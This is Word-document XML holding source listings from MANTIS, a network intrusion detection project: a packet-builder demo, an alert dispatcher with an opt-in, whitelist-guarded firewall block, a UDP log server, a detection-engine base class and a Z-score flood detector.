    <w:p w14:paraId="62F895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build_ipv4(tcp + data, PROTO_TCP, **kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758A77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148D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79E0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build_udp(sport=5353, dport=53, data=b"", **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA39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udp = struct.pack("!HHHH", sport, dport, 8 + len(data), 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A29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build_ipv4(udp + data, PROTO_UDP, **kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A4EF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86DAA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7EF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build_icmp(icmp_type=8, code=0, data=b"ping", **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F3A5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icmp = struct.pack("!BBH", icmp_type, code, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151063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build_ipv4(icmp + data, PROTO_ICMP, **kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D84F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7862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5841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22DF7F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PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73398A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frames = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017F0C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build_tcp(data=b"GET / HTTP/1.1"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0205B8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build_udp(data=b"\x00\x01dns"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308BE0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build_icmp(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012518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b"\x00" * 10,                       # too short</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071D23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build_ipv4(b"", 47),                # GRE - valid IPv4, unusual proto</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D631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4B23C6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f in frames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3693C6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result = p.parse(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E33B4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result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009811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print("%-5s %s -&gt; %s  %s" % (result["proto"], result["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E1C3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result["dst"], result["info"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440335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4A2120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print("dropped (%d bytes)" % len(f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EC3B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print(p.stats())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B6D79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src/sensor_node/dispatcher.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297882B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(187 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3B39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6E2B74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"""Alert fan-out and response policy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14306F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429E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Chapter 4 class diagram shows the Sensor composing an `AlertDispatcher`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D8D7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alongside the `PacketParser`. This module is that component. Previously the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DF63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fan-out was spread across two files: the sensor pushed a string onto a queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FAFF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and separately called the firewall, while `main.py` independently wrote the CSV</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2D6A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log and sent the UDP telemetry. Any new output surface therefore had to be</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754B55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wired into two places, and an alert raised in one mode was recorded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660E6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differently from the same alert raised in another.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518A91C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0747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Centralising it here means every alert, from every engine, is:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5B3CE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3C15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1. enriched once with ATT&amp;CK context and a risk score;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251E2A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2. recorded in the forensic HTML report;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="114E6B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3. written to the CSV audit trail (privacy policy applied);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087412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4. forwarded to the SIEM as structured JSON;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E6F8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5. pushed to whichever UI is attached;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E6F1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6. considered for an active-defence firewall drop.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DD27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4188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Step 6 implements the FR-7 / Chapter 5.7 requirement that *any* engine may</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601CCF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trigger a block, subject to the NFR-3 rule that blocking is opt-in and to a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4BFA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whitelist that can never be blocked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E81A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52EC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205746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4F2F6B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3654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646504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12610A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2FE1943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00A2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sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F59A2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C113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utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4612BF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418E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0ECB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AlertDispatcher:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B3CF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"""Single exit point for every alert the engines raise."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3E45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1006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config, reporter=None, alert_queue=None, logger=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D645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remote=None, defense=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2539DE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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3828D3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self.reporter = reporter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11552C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self.alert_queue = alert_queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9F4C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self.logger = logger</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793378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self.remote = remote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A126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self.defense = defense</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4547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E557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self.total = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C64E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self.by_kind = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F36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self.blocked = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C257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self._recent_alerts = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1296D81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EC27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------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AF32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dispatch(self, message, kind=None, src_ip=None, confidence=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1931C4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payload=None, engine=None, response_status=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255E68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"""Publish one alert to every configured sink.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CFCA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8D4C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`kind` may be supplied by the caller (the engine already knows what it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46ADC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detected); otherwise it is inferred from the message text.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BEEB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7B5B91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 = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D712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kind:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDC87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meta["kind"] = kind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A498F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0F6F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Packet retransmissions and request/response fragments can carry the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5232C9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same signature more than once. Publish one event per source/message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01621A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within a short window instead of inflating every downstream count.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8CF3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now = time.monotonic()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5961A7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dedup_seconds = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1267C2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0.0, float(getattr(self.config, "alert_dedup_seconds", 5.0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A570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dedup_key = (meta["kind"], src_ip or "", message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D4C5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previous = self._recent_alerts.get(dedup_key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A7BD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(dedup_seconds &gt; 0 and previous is not None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692DC4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and now - previous &lt; dedup_seconds):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE5A8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meta["suppressed_duplicate"] = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548E5B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meta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74628B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self._recent_alerts[dedup_key] = now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038C8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len(self._recent_alerts) &gt; 2048:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DE1D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cutoff = now - max(dedup_seconds, 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24298D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self._recent_alerts = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691F72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key: seen for key, seen in self._recent_alerts.items()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76843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seen &gt;= cutoff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496093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19178E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CF9A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self.total += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325CB8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self.by_kind[meta["kind"]] = self.by_kind.get(meta["kind"], 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1561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593E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Decide the response before publishing so an optional status label is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B4D4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truthful. "Blocked" is shown only after the firewall confirms that a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5254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rule was inserted; otherwise the observation is merely "Flagged".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7473B2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blocked = self.maybe_block(src_ip, meta["kind"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159805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meta["blocked"] = blocked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04114E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response_status:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2704BA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message = "%s (%s)" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7BAC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message, "Blocked" if blocked else "Flagged")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A35E7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6C06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1. forensic HTML report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4E8F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self.reporter is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDDC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7A847B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self.reporter.add_alert(message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47861D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except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F22F8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print("[!] report error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA8BD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7824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2. CSV audit trail (applies the privacy policy internally)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032B0E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self.logger is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D8F5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self.logger.log_alert(message, src_ip=src_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F41EE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engine=engine or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6795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confidence=confidence, payload=payload,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E778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verdict=meta["kind"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121708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A32A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3. structured JSON telemetry to the SIEM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469DA3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self.remote is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289664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self.remote.send_log(message, src_ip=src_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA03D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engine=engine or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7280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confidence=confidence, payload=payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C175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BCFB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4. attached UI (CLI dashboard or web bridge)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4208A3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self.alert_queue is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6086B4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self.alert_queue.put(message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACD9C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2CF009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print("\n[!!!] " + message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA7AEE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EDFF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meta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B72AFE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D3E4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------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50FD4D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maybe_block(self, src_ip, kind):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A1C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"""Apply the opt-in blocking policy for one source address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795AF9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1702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Three independent conditions must all hold before a rule is inserted,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D913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which is what makes the behaviour defensible under NFR-3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE0F0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8300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* blocking is explicitly enabled in configuration;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B71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* this detection kind is in the permitted block_on list;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EF7E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* the address is not whitelisted (loopback and the local host are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E58F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whitelisted by default, so MANTIS can never firewall itself off).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBD66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600985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src_ip or self.defense is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685002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607374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getattr(self.config, "block_enabled", False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483B84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2E67A8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allowed = getattr(self.config, "block_on", [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B180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accept either the specific kind ("sqli") or its policy group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A4FE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("payload"), so a policy need not enumerate every sub-family</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BA8F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kind not in allowed and mitre.parent_kind(kind) not in allowed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250FC4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68E267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src_ip in getattr(self.config, "block_whitelist", []):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A27A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%s is whitelisted - not blocking" % src_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044CCA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10FEC9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src_ip in self.blocked:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197BC7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3C8E96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2AF9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self.defense.block_ip(src_ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBFDD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self.blocked.add(src_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078F8E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296D6F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6651E7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237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summary(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3BE6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{"alerts": self.total, "by_kind": dict(self.by_kind),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780847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"blocked_ips": sorted(self.blocked)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A8ED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B6A25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7FB7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6A061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utils.config import Config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BCB1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E1E2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class _FakeDefense:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB900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def block_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164BE3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[iptables] DROP %s" % ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786F2B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5BD2998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590F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cfg = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B3E5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 = AlertDispatcher(cfg, defense=_FakeDefense())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1874AD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1FE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print("-- blocking disabled (default, NFR-3) --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1745B6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d.dispatch("DDoS DETECTED! Z-Score: 4.2 (PPS: 9000)", src_ip="10.0.0.5",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687998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confidence=0.9)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD710C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AACE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print("\n-- blocking enabled --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C781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cfg.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BBC8C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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']", src_ip="10.0.0.7",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6DF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confidence=0.99)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640AC1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A3D0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print("\n-- whitelisted source --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267222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d.dispatch("PORT SCAN DETECTED! (Unique Ports: 90/sec)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038F1D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src_ip="127.0.0.1", confidence=0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246077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E210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print("\n", d.summary())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A79991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src/sensor_node/log_server.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BB10C9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(36 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7FE9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6F2619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23B0C8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FFFAFD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09D4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Phase 8: Central Log Server (Distributed Dashboard)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573676F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7E09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start_server(port=9999):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012CB5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2B4AEB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Listens for UDP alerts from remote MANTIS sensors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742862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C4E72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0.0.0.0 means listen on all interfaces</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787B41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server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8537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0B23E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4121DE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server_sock.bind(('0.0.0.0', port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4E97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print(f"[*] MANTIS Central Log Serve Running on UDP Port {port}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211D43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Waiting for alerts from Fedora Sensor...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB930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print("-------------------------------------------------------")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9653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7B05B5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True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25190F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Receive data (max 1024 bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D62B9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data, addr = server_sock.recvfrom(1024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6B30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message = data.decode('utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3988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70448E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Print Alert with nicer formatting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110A8E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print(f"[REMOTE ALERT from {addr[0]}] {message}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF735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12BB08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PermissionError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3DC7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print(f"[!] Error: Cannot bind to port {port}. Try sudo or a port &gt; 1024.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592AF8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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608B61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print("\n[!] Stopping Log Server.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2544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 as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CD3A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print(f"[!] Error: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5490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393E1E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1F25D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start_server()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A735730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Detection Engines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E48D7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src/engines/base.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C144E4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(85 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220B9B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32653F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"""Common contract shared by every MANTIS detection engine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7150288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2F86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NFR-5 (Maintainability) requires that "all detection engine classes shall</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594F82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implement a uniform public interface exposing analyse(), train(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4004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export_brain(), and import_brain() methods", and the Chapter 4 class diagram</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FB89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shows the sensor composing an abstract DetectionEngine rather than five</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E59C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unrelated classes. This module is that abstraction.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A5A5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C30F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benefit is concrete rather than cosmetic: because the sensor and the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3698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evaluation harness both talk to `analyse()` and `train()`, a sixth engine can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9317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be added by writing one subclass, with no change to the sensor orchestrator,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F298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evaluator, or the brain serialisation code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C20C3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5A79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Each engine keeps its original domain-specific method (`classify`,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE501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`calculate_baseline`, `check`) so existing callers and unit tests are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257E80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unaffected; `analyse()` is a thin uniform adapter over that method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0118484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986A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4139E9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65BE7E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058F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5032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Verdict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679F4F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"""Uniform result returned by every engine's analyse() method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BC16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BE38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label      - engine specific verdict string ("Scan", "Malicious", "DDoS")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9B76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confidence - 0.0..1.0 where available, else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26297D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detail     - engine specific extras (matched keywords, neighbours, z value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AF28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is_threat  - True when the label represents an attack for this engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABB1D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77582FA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2834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__slots__ = ("label", "confidence", "detail", "is_threat")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A81DCF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074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label, confidence=None, detail=None, is_threat=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A46F3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self.label = label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEC7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self.confidence = confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DCD1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self.detail = detail if detail is not None else {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6729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self.is_threat = is_threat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BF98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57A8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as_dict(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E837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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A147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"label": self.label,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E501D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"confidence": self.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727DBE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"detail": self.detail,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D12F5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"is_threat": self.is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7323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B3161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6B4A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__repr__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F151F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 = "n/a" if self.confidence is None else "%.3f" % self.confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18721A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"&lt;Verdict %s conf=%s threat=%s&gt;" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7CB7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self.label, conf, self.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A3D3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E60C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756B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DetectionEngine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A564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"""Abstract base class for the five MANTIS engines."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19094F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43A4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"engine"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0AA2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what this engine consumes, used for documentation and the evaluator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36169C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()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6C84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2A82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*args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEE23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"""Evaluate one observation and return a Verdict."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E152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NotImplementedError(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74234A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"%s must implement analyse()" % type(self).__name__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E19D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7197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samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD2B0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"""Learn from an iterable of labelled samples. Returns a summary dict.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC5A8F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EF23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Engines that are purely online (Z-Score, Bloom) override this with</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3D72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their own accumulation behaviour.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0950ED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00AA9B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NotImplementedError(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0CE8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"%s must implement train()" % type(self).__name__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0646D91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040F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21D681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"""Serialise learned state to a JSON-safe dict."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2E82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{}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C473EB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3EDE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4AD8BF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"""Restore learned state from export_brain() output."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782585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528CBD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5E52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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4995EE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"""Drop learned state, returning the engine to its seeded defaults."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D8FA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7A0A166E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src/engines/z_score.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700B66D4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(265 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0074D0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collections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6AA2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41D5E3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93A9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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD5DB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engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435D76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except ImportError:  # allow `python engines/z_score.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A831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base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168C29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19F52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DE7B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MinimalistStats(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223FA4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"""Volumetric flood detection from packets-per-second statistics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9EBA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5645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Two estimators run side by side:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA4A44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3ED8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a bounded rolling window (deque, maxlen=window_size) giving the *recent*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF1C8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mean and standard deviation, so the baseline adapts when legitimate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B7E9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traffic shifts and old behaviour is forgotten;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227837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Welford's online algorithm (Welford, 1962) maintaining the mean and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7902EF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variance of the entire session in constant space, updated incrementally</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009F44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per observation with no stored history.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79242A5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7A0B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Welford is used because the naive "sum of squares minus square of sum"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141FB6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formulation loses catastrophic precision once the running totals grow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9DE3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large, which is exactly the regime a flood produces. Welford instead</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072F58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accumulates the second central moment directly:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E74AC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165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     &lt;- n + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8A01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delta &lt;- x - mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327B09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  &lt;- mean + delta / n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351AC0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M2    &lt;- M2 + delta * (x - mean_new)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4AB8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var   &lt;- M2 / n                       (population variance)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73842F7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1E4A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rolling window remains the operational detector (it must forget), while</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7211F3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Welford figures provide the stable session-wide statistics quoted in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35ACCA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evaluation chapter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DB56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39935A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078C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"z_score"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA41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("packets_per_second",)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC8AEE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EA8E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A single outlier inside a population of n samples can never score higher</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346173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than (n-1)/sqrt(n). With the default window of 30 that ceiling is 5.29,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19977A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but it collapses toward the threshold as an attack fills the window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63349B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MIN_WARMUP = 5</w:t>
      </w:r>
    </w:p>
